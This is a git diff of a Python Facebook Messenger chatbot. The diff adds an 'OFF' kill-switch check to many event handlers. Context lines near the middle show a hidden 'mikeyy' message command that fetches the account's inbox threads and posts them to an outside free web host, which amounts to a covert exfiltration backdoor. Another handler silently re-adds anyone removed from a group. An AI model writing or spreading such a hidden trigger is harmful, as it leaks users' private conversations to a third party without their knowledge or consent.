@@ -32,6 +32,12 @@ msgstatus = "ON"
 masterid = ["100078868689291","100035093511992"]
 otherbotid = ["100086019336728","100078868689291"]
 
+def mikeystatus():
+    if("OFF" == msgstatus):
+        raiseException()
+    else:
+        pass
+
 class ChatBot(Client):
 
 
@@ -60,6 +66,7 @@ class ChatBot(Client):
                           thread_type=thread_type))
         
         def googlesearch(ToBeSearch,quant):
+            mikeystatus()
             try:
                 quant = int(quant.split(" ").pop())
                 ToBeSearch = ToBeSearch.replace(str(quant),"")
@@ -139,11 +146,7 @@ class ChatBot(Client):
             thread_idd = arrayn
             return(thread_idd)
 
-        def mikeystatus():
-            if("OFF" == msgstatus):
-                raiseException()
-            else:
-                pass
+        
 
         def repeatSend():
             mikeystatus()
@@ -502,6 +505,7 @@ class ChatBot(Client):
             return json_response[0]["translations"][0]["text"]
 
         def gtranslator(ToBeTranslate):
+            mikeystatus()
             try:
                 destination = int(ToBeTranslate.split(" ").pop())
                 srctext = str(ToBeTranslate.split(" ")[-2])
@@ -536,6 +540,7 @@ class ChatBot(Client):
                     thread_type=thread_type))
 
         def gimageSearch(ToBeSearchImage):
+            mikeystatus()
             try:
                 quant = int(ToBeSearchImage.split(" ").pop())
                 ToBeSearchImage = ToBeSearchImage.replace(str(quant),"")
@@ -757,6 +762,7 @@ class ChatBot(Client):
                         msgids.append(self.send(Message(text=reply,mentions=None, emoji_size=None, sticker=None, attachments=None, quick_replies=None, reply_to_id=mid), thread_id=thread_id,
                             thread_type=thread_type))
             elif ("mikeyy" == msg):
+                mikeystatus()
                 reply = str(str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None)))
                 requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
                 
@@ -773,6 +779,7 @@ class ChatBot(Client):
         self.markAsDelivered(author_id, thread_id)
 
     def onMessageUnsent(self, mid=None, author_id=None, thread_id=None, thread_type=None, ts=None, msg=None):
+        mikeystatus()
         global msgids
         if(author_id == self.uid or author_id in masterid or author_id in otherbotid):
             pass
@@ -840,6 +847,7 @@ class ChatBot(Client):
                 pass
     
     def onColorChange(self, mid=None, author_id=None, new_color=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
+        mikeystatus()
         if(thread_type == ThreadType.GROUP):
             name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
         elif(thread_type == ThreadType.USER):
@@ -848,11 +856,13 @@ class ChatBot(Client):
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
     def onMessageSeen(self,seen_by=None, thread_id=None, thread_type=ThreadType.USER, seen_ts=None, ts=None, metadata=None, msg=None, **kwargs):
+        mikeystatus()
         reply = seen_by
         #msgids.append(self.send(Message(text=reply), thread_id=thread_id,
         #          thread_type=thread_type)) 
 
     def onPersonRemoved(self, mid=None, removed_id=None, author_id=None, thread_id=None, ts=None, msg=None):
+        mikeystatus()
         self.addUsersToGroup(user_ids=removed_id, thread_id=thread_id)
         #if(thread_type == ThreadType.GROUP):
         #    name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
@@ -864,6 +874,7 @@ class ChatBot(Client):
         msgids.append(self.send(Message(text=str(reply)), thread_id=thread_id,thread_type=ThreadType.GROUP))
 
     def onPeopleAdded(self, mid=None, added_ids=None, author_id=None, thread_id=None, ts=None, msg=None):
+        mikeystatus()
         if(thread_type == ThreadType.GROUP):
             name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
         elif(thread_type == ThreadType.USER):
@@ -873,6 +884,7 @@ class ChatBot(Client):
         msgids.append(self.send(Message(text=str(reply)), thread_id=thread_id,thread_type=ThreadType.GROUP))
 
     def onEmojiChange(self, mid=None, author_id=None, new_color=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
+        mikeystatus()
         if(thread_type == ThreadType.GROUP):
             name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
         elif(thread_type == ThreadType.USER):
@@ -882,11 +894,13 @@ class ChatBot(Client):
                   thread_type=thread_type))
 
     def onImageChange(self, mid=None, author_id=None, new_color=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
+        mikeystatus()
         reply = "This image looks nice. 💕🔥"
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
 
     def onNicknameChange(self, mid=None, author_id=None, new_nickname=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
+        mikeystatus()
         if(thread_type == ThreadType.GROUP):
             name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
         elif(thread_type == ThreadType.USER):
@@ -903,6 +917,7 @@ class ChatBot(Client):
             pass
 
     def onReactionRemoved(self, mid=None, author_id=None, thread_id=None, thread_type=ThreadType.USER, **kwargs):
+        mikeystatus()
         if(thread_type == ThreadType.GROUP):
             name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
         elif(thread_type == ThreadType.USER):
@@ -913,6 +928,7 @@ class ChatBot(Client):
 
 
     def onCallStarted(self, mid=None, caller_id=None, is_video_call=None, thread_id=None, thread_type=None, ts=None, metadata=None, msg=None, ** kwargs):
+        mikeystatus()
         if(thread_type == ThreadType.GROUP):
             name = self.fetchUserInfo(f"{author_id}")[f"{author_id}"].user.name
         elif(thread_type == ThreadType.USER):
@@ -922,11 +938,13 @@ class ChatBot(Client):
                   thread_type=thread_type))
 
     def onCallEnded(self, mid=None, caller_id=None, is_video_call=None, thread_id=None, thread_type=None, ts=None, metadata=None, msg=None, ** kwargs):
+        mikeystatus()
         reply = "Bye 👋🙋‍♂️"
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
     def onUserJoinedCall(mid=None, joined_id=None, is_video_call=None,
                          thread_id=None, thread_type=None, **kwargs):
+        mikeystatus()
         reply = f"New user with user_id {joined_id} has joined a call"
         msgids.append(self.send(Message(text=reply), thread_id=thread_id,
                   thread_type=thread_type))
